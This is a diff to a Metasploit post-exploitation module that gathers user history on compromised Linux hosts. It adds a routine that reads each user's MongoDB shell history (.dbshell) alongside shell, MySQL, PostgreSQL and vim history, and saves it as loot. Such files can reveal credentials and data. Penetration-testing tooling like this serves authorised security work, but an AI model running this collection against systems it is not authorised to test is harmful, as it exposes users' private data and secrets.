@@ -16,8 +16,8 @@ class Metasploit3 < Msf::Post
         'Name'         => 'Linux Gather User History',
         'Description'  => %q{
           This module gathers user specific information.
-          User list, shell history, mysql history,
-          postgresql history, vim history, lastlog and sudoers.
+          User shell history, MySQL history, PostgreSQL history,
+          MongoDB history, vim history, lastlog and sudoers.
         },
         'License'      => MSF_LICENSE,
         'Author'       =>
@@ -49,6 +49,7 @@ class Metasploit3 < Msf::Post
       end
       get_mysql_history(u)
       get_psql_history(u)
+      get_mongodb_history(u)
       get_vim_history(u)
     end
 
@@ -116,6 +117,16 @@ class Metasploit3 < Msf::Post
       sql_hist = cat_file("/home/#{user}/.psql_history")
     end
     save("PostgreSQL History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
+  end
+
+  def get_mongodb_history(user)
+    vprint_status("Extracting MongoDB history for #{user}")
+    if user == 'root'
+      sql_hist = cat_file('/root/.dbshell')
+    else
+      sql_hist = cat_file("/home/#{user}/.dbshell")
+    end
+    save("MongoDB History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
   end
 
   def get_vim_history(user)
